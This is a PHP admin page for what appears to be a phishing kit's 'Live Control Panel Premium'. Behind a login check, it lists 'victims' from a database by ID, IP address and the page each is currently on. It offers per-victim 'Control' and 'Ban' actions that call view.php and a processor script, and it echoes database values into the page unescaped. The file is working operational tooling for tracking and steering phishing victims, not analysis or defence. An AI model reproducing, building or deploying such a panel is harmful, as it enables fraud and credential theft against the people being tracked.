<?php 
require "classes/Jeehan.class.php";
$jeehan = new Jeehan();
if(!isset($_SESSION['user']) OR $_SESSION['user']==""){
	exit(header("location: login.php"));
}

if(isset($_GET['logout'])){
	unset($_SESSION['user']);
	exit(header("location: login.php"));
}


?>
<!doctype html>
<html>
<head>
<title>LCP - Admin</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
<link rel="stylesheet" href="res/app.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"/>
<script src="res/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<i class='fa fa-user'></i> Welcome, <b> <?php echo substr(PNL_USERNAME, 0, 8);?></b>
</div>
<div class="right">
<button onclick="window.location='index.php';"><i class='fa fa-cog'></i> Live Mode </button>
<button onclick="window.location='settings.php';"><i class='fa fa-home'></i>Settings </button>
<button class="ban" onclick="window.location='index.php?logout';"><i class='fa fa-lock'></i> Log out</button>
</div>
</div>
<div class="content">
<div class="holder">
<div class="title">
List of all victims (Not live)
</div>
<div class="v-list" id="data">
<table>
<tr>
<th><i class='fa fa-user'></i> ID</th>
<th><i class='fa fa-globe'></i> IP</th>
<th><i class='fa-solid fa-file-lines'></i> Current Page</th>
<th><i class='fa fa-cog'></i> Action</th>
</tr>
<?php 
$c=0;
$getAll=$pdo->query("SELECT * FROM ".($jeehan->tbl)." WHERE ip NOT in (select ip from blockedvics) ORDER BY id DESC");
	$rows = $getAll->fetchAll(PDO::FETCH_ASSOC);
	if(!$rows){
		echo "<tr><td>No data</td></tr>";
	}else{
		foreach($rows as $row){
			$c++;		
			if($c==2){
				$css="selected";
				$c=0;
			}else{
				$css="";
			}
$ip = $row['ip'];
echo  "
<tr class='$css'>
<td> ".$row['id']." </td>
<td> ".$row['ip']."   </td>
<td>".$row['current_page']."</td>
<td><button onclick='view(".$row['id'].")'>Control <i class='fa-solid fa-arrow-right'></i></button> <button class='ban' onclick='ban(\"$ip\")'><i class='fa-solid fa-ban'></i> Ban </button></td>
</tr>
";



		}

	}

?>
</table>
</div>
</div>
</div>


<div class="footer">
<div class="info">Live Control Panel Premium</div>
</div>
<script>

function ban(ip){
	var conf = confirm("You sure want to block victim (ID="+ip+")?");
	if(conf){
	$.post("process/processor.php",{ban:ip}, function(done){
		alert(done);
	} );
	}
}

function view(id){
	window.open("view.php?vid="+id);
}

</script>
</body>
</html>